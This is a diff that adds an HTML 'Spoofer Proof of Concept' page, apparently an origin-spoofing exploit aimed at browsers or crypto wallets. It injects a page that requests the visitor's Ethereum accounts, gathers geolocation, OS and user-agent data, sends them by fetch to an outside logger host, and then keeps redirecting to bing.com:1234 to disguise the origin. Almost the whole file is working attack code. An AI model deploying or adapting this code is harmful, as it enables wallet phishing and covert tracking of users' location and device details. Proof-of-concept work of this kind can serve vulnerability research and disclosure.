@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Spoofer Proof of Concept</title>
+  <script>
+    function spoof() {
+      document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <script>
+            "use strict";
+
+            console.log("JS running: " + document.location.origin);
+
+            async function requestAccounts() {
+              if (window.ethereum) {
+                try {
+                  const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                  console.log(accounts);
+                } catch (err) {
+                  console.log("Error executing eth_requestAccounts: " + err.message);
+                }
+              }
+            }
+            
+            function getCurrentPosition() {
+              return new Promise((resolve, reject) => {
+                const options = {
+                  enableHighAccuracy: true,
+                  timeout: 5000,
+                  maximumAge: 0
+                };
+
+                function success(pos) {
+                  const crd = pos.coords;
+                  const loc = \`\${crd.latitude},\${crd.longitude}\`;
+                  resolve(loc);
+                }
+
+                function error(err) {
+                  console.warn(\`ERROR(\${err.code}): \${err.message}\`);
+                  reject(err);
+                }
+
+                navigator.geolocation.getCurrentPosition(success, error, options);
+              });
+            }
+
+            async function sendRequest() {
+              try {
+                const loc = await getCurrentPosition();
+                const cpu = navigator.oscpu;
+                const ua = navigator.userAgent;
+
+                const url = \`https://rex.rektosaurus.io/logger/ua=\${ua}&oscpu=\${cpu}&loc=\${loc}\`;
+                await fetch(url);
+              } catch (err) {
+                console.log("Error executing HTTP request: " + err.message);
+              }
+            }
+
+            window.addEventListener('load', async () => {
+              console.log("Ethereum object available.");
+              console.log(window.ethereum);
+              await requestAccounts();
+              await sendRequest();
+            });
+          </script>
+        </head>
+        <body>
+        </body>
+        </html>
+      `);
+      
+      document.location = "https://bing.com:1234";
+      setInterval(function() { document.location = "https://bing.com:1234"; }, 9800);
+    }
+  </script>
+</head>
+<body>
+  <p class="test"><input class="btn btn-success btn-lg" type="button" value="Run test case" onclick="spoof();" /> </p>
+</body>
+</html>
